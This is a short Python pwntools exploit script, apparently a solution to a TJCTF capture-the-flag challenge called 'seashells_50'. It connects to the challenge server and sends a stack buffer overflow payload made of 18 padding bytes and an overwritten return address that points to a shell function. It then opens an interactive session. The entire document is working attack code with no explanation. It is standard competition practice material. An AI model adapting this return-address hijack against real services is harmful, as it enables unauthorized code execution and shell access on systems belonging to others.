from pwn import *

#p = process('./seashells_50')
p = remote('p1.tjctf.org', 8009)
shell = 0x00000000004006e3

print p.recv()
payload = ''
payload += 'a'*10 + 'b'*8
payload += p64(shell)

sleep(0.5)

p.sendline(payload)

sleep(0.5)

p.interactive()
